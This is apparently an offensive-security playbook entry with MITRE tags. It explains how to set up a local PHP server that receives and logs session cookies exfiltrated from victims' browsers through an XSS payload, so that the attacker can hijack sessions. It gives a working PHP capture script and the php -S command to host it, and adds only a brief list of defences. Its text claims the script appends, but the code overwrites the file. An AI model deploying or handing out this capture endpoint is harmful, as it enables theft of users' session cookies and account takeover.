---
id: proc-php-cookie-setup
tags:
  - exfiltration
  - php
  - server-setup
type: procedure
tools:
  - '[[tools/PHP]]'
  - '[[tools/Local-Web-Server]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/php-cookie-capture]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.201Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Set-Up-Local-PHP-Server-for-Cookie-Capture

## Summary

This procedure sets up a local PHP-based web server to receive and log cookies exfiltrated from a victim's browser via an XSS payload, enabling further analysis for session hijacking.

## Description

To demonstrate the impact of XSS on insecure cookies, create a simple PHP script that captures the 'cookie' GET parameter and writes it to a file. Host this on a local web server (e.g., PHP's built-in server or Apache). The script handles incoming requests from the XSS redirect. Prerequisites include PHP installation and local port availability; this is typically run on the attacker's machine.

## Requirements

1. PHP runtime installed
2. Local web server capability (e.g., port 80 free)
3. Write permissions in the server directory for cookiefile.txt

## Defense

Defensive measures and detection strategies:

- Set HttpOnly flags on sensitive cookies to block JavaScript access
- Monitor outbound traffic for unexpected redirects to local/internal IPs
- Use network segmentation to prevent exfiltration to attacker-controlled servers

## Objectives

1. Establish an endpoint for receiving stolen data
2. Log cookies for potential reuse in session hijacking
3. Validate exfiltration path from XSS

## Instructions

### Step 1: Create PHP Capture Script

**Context**: Write a PHP file to handle GET requests and store cookie data in a text file.

**Command** ([[commands/php-cookie-capture]]):
```php
<?php $cookie = $_GET['cookie']; $f = fopen("cookiefile.txt","w"); fwrite($f,$cookie); fclose($f); ?>
```

> Save as test.php. This retrieves the 'cookie' parameter, opens cookiefile.txt for writing, appends the value, and closes the file. Expected output: File created/updated with cookie string upon request.

### Step 2: Host on Local Server

**Context**: Start a web server to serve the PHP script at http://localhost/test.php.

**Instructions**: Use PHP built-in server or equivalent:

```bash
php -S localhost:80
```

> Place test.php in the server root. Expected output: Server logs show listening on port 80; accessible via browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/php-cookie-capture]]

## Tools Used

- [[tools/PHP]]
- [[tools/Local-Web-Server]]

## Tags

- [[Exfiltration]]
- [[tools/PHP]]
